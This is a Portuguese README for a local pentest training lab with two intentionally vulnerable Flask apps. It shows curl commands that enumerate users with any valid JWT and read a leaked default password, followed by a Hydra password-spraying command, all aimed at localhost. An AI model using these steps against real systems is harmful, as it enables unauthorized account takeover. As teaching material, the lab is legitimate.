
# 🧪 Lab de Pentest: Combo VAZAMENTO JWT + SENHA PADRÃO (Python/Flask)

Este repositório contém o código-fonte de duas aplicações Flask (Python) simulando um ambiente de **Pentest Fictício** (chamado "CorpWeb Security Lab"). O objetivo é demonstrar uma metodologia que combina a **Enumeração de Usuários via JWT** em um alvo para realizar um **Brute Force cirúrgico** no alvo seguinte.

-----

## ⚠️ AVISO LEGAL E ÉTICO (IMPORTANTE)

Este código foi criado **EXCLUSIVAMENTE PARA FINS EDUCACIONAIS E DE ESTUDO**.

  * **Não utilize este código** para atacar ou testar a segurança de sistemas, redes ou aplicações que você não possui permissão expressa e documentada para testar.
  * A prática de segurança ofensiva (pentest) deve sempre seguir a lei e a ética (*white hat*).

-----

## 🛠️ Configuração do Ambiente

Você precisará ter o **Python 3** e o **Hydra** instalados em seu sistema.

### 1\. Clonar o Repositório

```bash
git clone https://github.com/jhonxl/CorpWeb
cd CorpWeb
```

### 2\. Configurar e Ativar o Ambiente Virtual (Obrigatório\!) 🔑

Para evitar erros como o `externally-managed-environment` (comum no Kali/Debian), use um ambiente virtual (`venv`).

```bash
# 1. Cria o ambiente virtual
python3 -m venv venv

# 2. Ativa o ambiente virtual (O seu prompt deve mudar para (venv))
source venv/bin/activate

# 3. Instala as dependências (Flask e PyJWT)
pip install -r requirements.txt
```

### 3\. Rodar as Aplicações (Em Terminais Separados)

**Você precisa de duas janelas de terminal, ambas com o ambiente `(venv)` ativado.**

| Alvo | Porta | Comando |
| :--- | :--- | :--- |
| **Alvo 1: JWT API** | 5000 | `python alvo1_jwt.py` |
| **Alvo 2: Senha Padrão**| 5001 | `python alvo2_senha_padrao.py` |

-----

## 🎯 Alvo 1: MyCorpWeb (Vulnerabilidade: Broken Access Control/JWT)

**URL Base:** `http://127.0.0.1:5000`

Este alvo simula uma API. Toda interação (login e ataque) é feita via requisições HTTP (`POST` ou `GET` com headers), e **não** por um formulário no navegador.

### 1\. Obter o Token (Login via POST)

**ATENÇÃO:** O endpoint `/login` só aceita o método `POST`.

```bash
# 1. Requisição de Login para obter o JWT
# Usuário e senha padrão para o lab: 'user1@corpweb.lab' / 'teste123'
curl -X POST http://127.0.0.1:5000/login -H "Content-Type: application/json" -d '{"email": "user1@corpweb.lab", "password": "teste123"}'
```

### 2\. ATAQUE: Enumeração de Usuários (Broken Access Control)

Use o token recebido acima (`[SEU_TOKEN_JWT]`) no cabeçalho `Authorization`.

```bash
# 2. Enumeração de Usuários
# ⚠️ Falha: Qualquer token válido lista TODOS os usuários do sistema.
curl -X GET http://127.0.0.1:5000/api/users/ -H "Authorization: Bearer [SEU_TOKEN_JWT]"
```

**Resultado Esperado:** A resposta retorna uma lista JSON com **todos os usuários**, incluindo e-mails (que serão usados no Alvo 2).

-----

## 🔨 Alvo 2: CorpWeb Connect (Vulnerabilidade: Configuração Exposta)

**URL Base:** `http://127.0.0.1:5001`

### 1\. Visualizar a Tela de Login 🌐

Para ver o formulário que você atacará (simulação visual):

  * **ACESSE:** `http://127.0.0.1:5001/login`

### 2\. Descoberta da Senha Padrão (Vulnerabilidade)

**Foco no Vídeo:** Mostre a descoberta do endpoint de configuração.

```bash
# ATAQUE: Acesso direto ao endpoint /default (sem autenticação)
curl http://127.0.0.1:5001/default
```

**Resultado Esperado:** O servidor revela o valor `default_password: CorpWeb123!`.

### 3\. Brute Force Cirúrgico com Hydra

Crie o arquivo `users.txt` com os e-mails/usernames coletados do **Alvo 1** (ex: `admin`, `manager`, `jsilva`).

```bash
# COMANDO HYDRA:
# -L users.txt: Lista de usernames coletados do Alvo 1
# -p CorpWeb123!: Senha Única (a senha padrão encontrada)
hydra -L users.txt -p CorpWeb123! 127.0.0.1 -s 5001 http-post-form \
"/check_login:username=^USER^&password=^PASS^:Invalid Credentials"
```

**Resultado Esperado:** O Hydra listará os usuários que ainda utilizam a senha padrão (`admin` e `manager`).

-----

**Lembre-se de desativar o ambiente virtual ao terminar:** `deactivate`

```
```
